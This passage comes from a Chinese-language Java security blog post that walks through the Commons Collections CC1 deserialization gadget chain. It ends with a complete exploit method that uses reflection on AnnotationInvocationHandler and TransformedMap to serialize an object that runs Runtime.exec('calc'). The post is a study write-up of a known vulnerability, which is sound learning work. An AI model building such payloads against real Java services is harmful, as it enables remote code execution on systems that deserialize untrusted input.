class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>    map.put(<span class="hljs-string">&quot;aa&quot;</span>,<span class="hljs-string">&quot;bb&quot;</span>);<br>    Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>    <span class="hljs-keyword">for</span> (Map.Entry entry : transformedMap.entrySet()) &#123;<br>        entry.setValue(runtime);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>继续网上查询，查找谁调用了<code>setValue()</code>方法，发现存在许多方法，我们的目的是查找<code>readObejct</code>方法，在<code>readObejct</code>方法中调用<code>setValue()</code>方法既可以实现放序列化，查找到<code>sun.reflect.annotation</code>包中的<code>AnnotationInnvocationHandler</code>的<code>readObejct</code>方法调用了<code>AbstractInputCheckedMapDecorator</code>中的<code>setVale()</code>方法。</p><p><img src="/../../../blog_image/image-20231026162954726.png" alt="image-20231026162954726"></p><p>至此调用链就清楚了：</p><p><img src="/../../../blog_image/image-20231026170328365.png" alt="image-20231026170328365"></p><p><code>readObjetc</code>中的判断如下：</p><p><img src="/../../../blog_image/image-20231026172019179.png" alt="image-20231026172019179"></p><ol><li>将我们的map的key设置为一个注解中的成员变量，如<code>Target</code>注解存在一个成员变量<code>value</code>。</li></ol><p><img src="/../../../blog_image/image-20231026172425292.png" alt="image-20231026172425292"></p><p>然后创建一个代理对象，去调用了我们熟悉的<code>AbstractInputCheckedMapDecorator</code>的<code>setValue</code>方法。</p><p><img src="/../../../blog_image/image-20231026172616941.png" alt="image-20231026172616941"></p><p>因此思路在于如何修改这个<code>parent</code>对象的属性，可以没有办法。查找其他<code>transform</code>发现<code>ConstantTransformer</code>中<code>transform</code>不管输入什么都是调用他的成员变量，因此可以只要我们在创建的时候将<code>Runtime.class</code>赋值给他的成员变量，然后去调用<code>transform</code>方法就会返回<code>Runtime.class</code></p><h2 id="3-3-完整exp"><a href="#3-3-完整exp" class="headerlink" title="3.3 完整exp:"></a>3.3 完整exp:</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">TransformedMapExp03</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        map.put(<span class="hljs-string">&quot;aa&quot;</span>, <span class="hljs-string">&quot;bb&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(map, <span class="hljs-literal">null</span>, invokerTransformer);<br>        <span class="hljs-comment">// 发现是AnnotationInvocationHandler类中调用了readObejct方法，</span><br>        <span class="hljs-comment">// readObject方法中会使用到setValue方法</span><br>        <span class="hljs-comment">// 但是AnnotationInvocationHandler这个类不是public的</span><br>        <span class="hljs-comment">// 1.使用反射去获取这个类</span><br>        Class&lt;?&gt; aClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; aClassDeclaredConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<br>        aClassDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">// 创建对象</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">aObejct</span> <span class="hljs-operator">=</span> aClassDeclaredConstructor.newInstance(Override.class, transformedMap);<br>        <span class="hljs-comment">// 执行反序列化</span><br>        serialize(aObejct);<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        stream.writeObject(o);<br>        stream.close();<br>    &#125;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">stream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-string">&quot;a.bin&quot;</span>));<br>        stream.readObject();<br>        stream.close();<br>    &#125;<br></code></pre></td></tr></table></figure><h1 id="4-疑惑："><a href="#4-疑惑：" class="headerlink" title="4. 疑惑："></a>4. 疑惑：</h1><h2 id="4-1-疑惑点一：为什么要加上new-ConstantTransformer-Runtime-class-？"><a href="#4-1-疑惑点一：为什么要加上new-ConstantTransformer-Runtime-class-？" class="headerlink" title="4.1 疑惑点一：为什么要加上new ConstantTransformer(Runtime.class)？"></a>4.1 疑惑点一：为什么要加上new ConstantTransformer(Runtime.class)？</h2><p>开始我们知道使用chainedTransformer中的<code>transfomer</code>方法可以方便我们去调用，我们传入多个对象就会不断循环去调用这些对象的<code>transfomer</code>方法。</p><p>如图：</p><p><img src="/../../../blog_image/image-20231026174119500.png" alt="image-20231026174119500"></p><p>我们只要将我们需要传入的<code>Runtime.class</code>就可以实现我们的链路了。</p><p><img src="/../../../blog_image/image-20231026174331664.png" alt="image-20231026174331664"></p><h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ul><li>视频：<a href="https://www.bilibili.com/video/BV1no4y1U7E1/?spm_id_from=333.999.0.0&vd_source=a015846fd4dda3664f6a3becf9028a53">Java反序列化CommonsCollections篇(一) CC1链手写EXP_哔哩哔哩_bilibili</a></li><li>博客：<ul><li><a href="https://www.cnblogs.com/h0cksr/p/16189755.html">java反序列化(三)CommonsCollections篇 – CC1 - h0cksr - 博客园 (cnblogs.com)</a></li><li><a href="https://blog.csdn.net/weixin_45808483/article/details/122743960">【精选】Java安全入门(二)——CC链1 分析+详解_cc1利用链_ErYao7的博客-CSDN博客</a></li><li><a href="https://xz.aliyun.com/t/12669">JAVA安全初探(三):CC1链全分析 - 先知社区 (aliyun.com)</a></li><li><a href="https://drun1baby.top/2022/06/06/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8701-CC1%E9%93%BE/">Java反序列化Commons-Collections篇01-CC1链 | Drunkbaby’s Blog (drun1baby.top)</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java安全</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
